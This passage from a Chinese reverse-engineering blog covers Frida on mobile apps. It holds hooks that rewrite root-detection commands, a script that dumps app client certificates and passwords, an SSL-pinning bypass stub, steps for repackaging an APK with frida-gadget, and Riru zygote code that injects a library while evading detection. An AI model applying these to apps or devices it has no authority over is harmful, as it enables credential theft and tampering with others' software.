Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execv&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execv() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execvp&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execvp() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execvpe&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execvpe() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="SSL双向认证"><a href="#SSL双向认证" class="headerlink" title="SSL双向认证"></a>SSL双向认证</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_KeyStore_load</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ByteString = Java.use(<span class="hljs-string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);<br>        <span class="hljs-keyword">var</span> myArray=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1024</span>);<br>        <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; myArray.length; i++) &#123;<br>            myArray[i]= <span class="hljs-number">0x0</span>;<br>         &#125;<br>        <span class="hljs-keyword">var</span> buffer = Java.array(<span class="hljs-string">&#x27;byte&#x27;</span>,myArray);<br>        <br>        <span class="hljs-keyword">var</span> StringClass = Java.use(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>        <span class="hljs-keyword">var</span> KeyStore = Java.use(<span class="hljs-string">&quot;java.security.KeyStore&quot;</span>);<br>        KeyStore.load.overload(<span class="hljs-string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arg0</span>) </span>&#123;<br>            <span class="hljs-built_in">console</span>.log(Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="hljs-string">&quot;java.lang.Throwable&quot;</span>).$new()));<br>            <br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;KeyStore.load1:&quot;</span>, arg0);<br>            <span class="hljs-built_in">this</span>.load(arg0);<br>        &#125;;<br>        KeyStore.load.overload(<span class="hljs-string">&#x27;java.io.InputStream&#x27;</span>, <span class="hljs-string">&#x27;[C&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arg0, arg1</span>) </span>&#123;<br>            <span class="hljs-built_in">console</span>.log(Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="hljs-string">&quot;java.lang.Throwable&quot;</span>).$new()));<br><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? StringClass.$new(arg1) : <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-keyword">if</span> (arg0)&#123;<br>                <span class="hljs-keyword">var</span> file =  Java.use(<span class="hljs-string">&quot;java.io.File&quot;</span>).$new(<span class="hljs-string">&quot;/sdcard/Download/&quot;</span>+ <span class="hljs-built_in">String</span>(arg0)+<span class="hljs-string">&quot;.p12&quot;</span>);<br>                <span class="hljs-keyword">var</span> out = Java.use(<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);<br>                <span class="hljs-keyword">var</span> r;<br>                <span class="hljs-keyword">while</span>( (r = arg0.read(buffer)) &gt; <span class="hljs-number">0</span>)&#123;<br>                    out.write(buffer,<span class="hljs-number">0</span>,r)<br>                &#125;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;save success!&quot;</span>)<br>                out.close()<br>            &#125;<br>            <span class="hljs-built_in">this</span>.load(arg0, arg1);<br>        &#125;;<br><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hook_KeyStore_load...&quot;</span>);<br><br><br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_ssl</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ClassName = <span class="hljs-string">&quot;com.android.org.conscrypt.Platform&quot;</span>;<br>        <span class="hljs-keyword">var</span> Platform = Java.use(ClassName);<br>        <span class="hljs-keyword">var</span> targetMethod = <span class="hljs-string">&quot;checkServerTrusted&quot;</span>;<br>        <span class="hljs-keyword">var</span> len = Platform[targetMethod].overloads.length;<br>        <span class="hljs-built_in">console</span>.log(len);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>            Platform[targetMethod].overloads[i].implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;class:&quot;</span>, ClassName, <span class="hljs-string">&quot;target:&quot;</span>, targetMethod, <span class="hljs-string">&quot; i:&quot;</span>, i, <span class="hljs-built_in">arguments</span>);<br>                <span class="hljs-comment">//printStack(ClassName + &quot;.&quot; + targetMethod);</span><br>            &#125;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;<br>    hook_KeyStore_load()    <br>    <span class="hljs-comment">// hook_ssl()</span><br>&#125;<br>setImmediate(main);<br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://frida.re/">官网</a></li><li><a href="https://github.com/frida/frida/releases">github</a></li><li><a href="https://frida.re/docs/javascript-api">javascript-api</a></li></ul><ul><li><a href="https://zhuanlan.zhihu.com/p/101401252">frida api介绍</a></li><li><a href="http://www.ioshacker.net/">IOS逆向论坛</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>frida</tag>
      
      <tag>hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida gadget</title>
    <link href="/2021/08/25/frida-gadget/"/>
    <url>/2021/08/25/frida-gadget/</url>
    
    <content type="html"><![CDATA[<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><h3 id="1-下载gadget"><a href="#1-下载gadget" class="headerlink" title="1.下载gadget"></a>1.下载gadget</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frida-gadget-xxxxx-android-arm<span class="hljs-selector-class">.so</span><span class="hljs-selector-class">.xz</span><br>frida-gadget-xxxxx-android-arm64<span class="hljs-selector-class">.so</span>.xz<br></code></pre></td></tr></table></figure><h3 id="2-APK解包"><a href="#2-APK解包" class="headerlink" title="2. APK解包"></a>2. APK解包</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">apktool d -r xx.apk  <span class="hljs-comment">//-r 不反编译资源文件</span><br></code></pre></td></tr></table></figure><h3 id="3-添加lib和修改smali"><a href="#3-添加lib和修改smali" class="headerlink" title="3.添加lib和修改smali"></a>3.添加lib和修改smali</h3><h4 id="3-1-1-将gadget-so拷贝到解包后lib-xxx-目录下"><a href="#3-1-1-将gadget-so拷贝到解包后lib-xxx-目录下" class="headerlink" title="3.1.1 将gadget.so拷贝到解包后lib/xxx/目录下"></a>3.1.1 将gadget.so拷贝到解包后lib/xxx/目录下</h4><h4 id="3-1-2-修改入口smali的construct-method"><a href="#3-1-2-修改入口smali的construct-method" class="headerlink" title="3.1.2 修改入口smali的construct method"></a>3.1.2 修改入口smali的construct method</h4><h4 id="3-1-3-将locals加1"><a href="#3-1-3-将locals加1" class="headerlink" title="3.1.3 将locals加1"></a>3.1.3 将locals加1</h4><h4 id="3-1-4-寄存器名称v0的数字使用locals数量的最后一个"><a href="#3-1-4-寄存器名称v0的数字使用locals数量的最后一个" class="headerlink" title="3.1.4 寄存器名称v0的数字使用locals数量的最后一个"></a>3.1.4 寄存器名称v0的数字使用locals数量的最后一个</h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">const-string v0, <span class="hljs-string">&quot;frida-gadget&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-static </span>&#123;v0&#125;, <span class="hljs-class">Ljava/lang/System;</span>-&gt;loadLibrary(<span class="hljs-class">Ljava/lang/String;</span>)V<br></code></pre></td></tr></table></figure> <img src="/2021/08/25/frida-gadget/images/%E6%B7%BB%E5%8A%A0lib%E5%92%8C%E4%BF%AE%E6%94%B9smali.png" class=""><h3 id="4-添加权限"><a href="#4-添加权限" class="headerlink" title="4.添加权限"></a>4.添加权限</h3><p>在AndroidManifest.xml中添加权限，一般的APK都会申请下面两个权限<br>，所以不用添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.INTERNET&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">uses-permission</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-打包"><a href="#5-打包" class="headerlink" title="5.打包"></a>5.打包</h3><p>直接apktool b xxx打包经常会报资源错误，可以尝试以下方式：</p><ul><li><p>直接删除出错的layout文件 </p></li><li><p>修改出错的layout文件</p></li><li><p>不解包资源文件，也就是在解包的时候加入-r选项<br>通过<code>-f -p </code>选项使得打包时忽略这些资源<br><code>apktool b -f -p . xxx -o output.apk</code></p><p>-f =&gt; –force-all<br>-p =&gt; resource path</p></li></ul><h3 id="6-签名-安装"><a href="#6-签名-安装" class="headerlink" title="6.签名/安装"></a>6.签名/安装</h3><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><h3 id="1-下载gadget-1"><a href="#1-下载gadget-1" class="headerlink" title="1.下载gadget"></a>1.下载gadget</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">frida</span>-gadget-<span class="hljs-number">15</span>.<span class="hljs-number">0</span>.<span class="hljs-number">18</span>-ios-universal.dylib.gz<br></code></pre></td></tr></table></figure><h3 id="2-脱壳后的应用包"><a href="#2-脱壳后的应用包" class="headerlink" title="2.脱壳后的应用包"></a>2.脱壳后的应用包</h3><h3 id="3-新建MonkeyApp-工程"><a href="#3-新建MonkeyApp-工程" class="headerlink" title="3.新建MonkeyApp 工程"></a>3.新建MonkeyApp 工程</h3> <img src="/2021/08/25/frida-gadget/images/MonkeyApp.png" class=""><h3 id="4-引入-FridaGadget-dylib"><a href="#4-引入-FridaGadget-dylib" class="headerlink" title="4. 引入 FridaGadget.dylib"></a>4. 引入 FridaGadget.dylib</h3> <img src="/2021/08/25/frida-gadget/images/%E5%BC%95%E5%85%A5FridaGadget.png" class=""><h3 id="5-编译运行"><a href="#5-编译运行" class="headerlink" title="5.编译运行"></a>5.编译运行</h3><h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="RIru加载gadget"><a href="#RIru加载gadget" class="headerlink" title="RIru加载gadget"></a>RIru加载gadget</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;jni.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;android/log.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXPORT __attribute__((visibility(<span class="hljs-meta-string">&quot;default&quot;</span>))) __attribute__((used))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOG_TAG  <span class="hljs-meta-string">&quot;C_COLA&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)</span><br><span class="hljs-keyword">static</span>  <span class="hljs-keyword">char</span>* loadPkgNameStr = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">loadPkgName</span><span class="hljs-params">(JNIEnv *env, jstring appDataDir)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!appDataDir)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *app_data_dir = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(appDataDir, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">int</span> user = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> package_name[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(app_data_dir, <span class="hljs-string">&quot;/data/%*[^/]/%d/%s&quot;</span>, &amp;user, package_name) != <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(app_data_dir, <span class="hljs-string">&quot;/data/%*[^/]/%s&quot;</span>, package_name) != <span class="hljs-number">1</span>) &#123;<br>            package_name[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(appDataDir, app_data_dir);<br>    <span class="hljs-keyword">return</span> package_name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getPkgNameFromFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* hookPackageName)</span></span>&#123;<br>    FILE* file = <span class="hljs-literal">NULL</span>;<br>    file = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;/data/local/tmp/pkg_name&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">fgets</span>(hookPackageName,<span class="hljs-number">200</span>,file);<br>      <span class="hljs-built_in">fclose</span>(file);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">hack_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br> <br>    <span class="hljs-built_in">LOGD</span>(<span class="hljs-string">&quot;hook thread :%d&quot;</span>, <span class="hljs-built_in">gettid</span>());<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//部分APP运行后会立即检测，延迟注入可以绕过检测</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* soPath_32 = <span class="hljs-string">&quot;/system/lib/libcola.so&quot;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* soPath_64 = <span class="hljs-string">&quot;/system/lib64/libcola.so&quot;</span>;<br>    <span class="hljs-keyword">void</span>* handle_64 = <span class="hljs-built_in">dlopen</span>( soPath_64, RTLD_LAZY );<br>    <span class="hljs-keyword">if</span>( !handle_64 )<br>        &#123;<br>            <span class="hljs-built_in">LOGD</span>(<span class="hljs-string">&quot;[%s](%d) dlopen 64bit lib get error: %s\n&quot;</span>, __FILE__, __LINE__, <span class="hljs-built_in">dlerror</span>());<br>            <span class="hljs-keyword">void</span>* handle_32 = <span class="hljs-built_in">dlopen</span>( soPath_32, RTLD_LAZY );<br>               <span class="hljs-keyword">if</span>( !handle_32 )<br>                    &#123;<br>                     <span class="hljs-built_in">LOGD</span>(<span class="hljs-string">&quot;[%s](%d) dlopen 32bit lib get error: %s\n&quot;</span>, __FILE__, __LINE__, <span class="hljs-built_in">dlerror</span>());<br>                    &#125;<br><br>        &#125;<br>    <span class="hljs-built_in">LOGD</span>(<span class="hljs-string">&quot;so  inject finish&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><br><span class="hljs-function">EXPORT <span class="hljs-keyword">void</span> <span class="hljs-title">nativeForkAndSpecializePre</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv *env, jclass clazz, jint *_uid, jint *gid, jintArray *gids, jint *runtimeFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">        jobjectArray *rlimits, jint *mountExternal, jstring *seInfo, jstring *niceName,</span></span><br><span class="hljs-params"><span class="hljs-function">        jintArray *fdsToClose, jintArray *fdsToIgnore, jboolean *is_child_zygote,</span></span><br><span class="hljs-params"><span class="hljs-function">        jstring *instructionSet, jstring *appDataDir, jboolean *isTopApp, jobjectArray *pkgDataInfoList,</span></span><br><span class="hljs-params"><span class="hljs-function">        jobjectArray *whitelistedDataInfoList, jboolean *bindMountAppDataDirs, jboolean *bindMountAppStorageDirs)</span> </span>&#123;<br><br>        loadPkgNameStr = <span class="hljs-built_in">loadPkgName</span>(env, *appDataDir);<br><br>&#125;<br><br><span class="hljs-function">EXPORT <span class="hljs-keyword">int</span> <span class="hljs-title">nativeForkAndSpecializePost</span><span class="hljs-params">(JNIEnv *env, jclass clazz, jint res)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// in app process</span><br>          <span class="hljs-keyword">if</span> (loadPkgNameStr != <span class="hljs-literal">NULL</span>) &#123;<br>               <span class="hljs-keyword">char</span>  hookPkgName[<span class="hljs-number">200</span>] = <span class="hljs-string">&quot; &quot;</span>;<br>               <span class="hljs-built_in">getPkgNameFromFile</span>(hookPkgName);<br>               <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(hookPkgName,loadPkgNameStr,<span class="hljs-built_in">strlen</span>(loadPkgNameStr)))&#123;<br>                   <span class="hljs-keyword">int</span> ret;<br>                   <span class="hljs-keyword">pthread_t</span> ntid;<br>                <span class="hljs-comment">//    LOGD(&quot;begin sleep 15000ms&quot;);</span><br>                <span class="hljs-comment">//    sleep(15000);</span><br>                   <span class="hljs-keyword">if</span>((ret = <span class="hljs-built_in">pthread_create</span>(&amp;ntid, <span class="hljs-literal">NULL</span>, hack_thread, <span class="hljs-literal">NULL</span>))) &#123;<br>                              <span class="hljs-built_in">LOGD</span>(<span class="hljs-string">&quot;can&#x27;t create thread: %s\n&quot;</span>, <span class="hljs-built_in">strerror</span>(ret));<br>                      &#125;<br>               &#125;<br>          &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// in zygote process, res is child pid</span><br>        <span class="hljs-comment">// don&#x27;t print log here, see 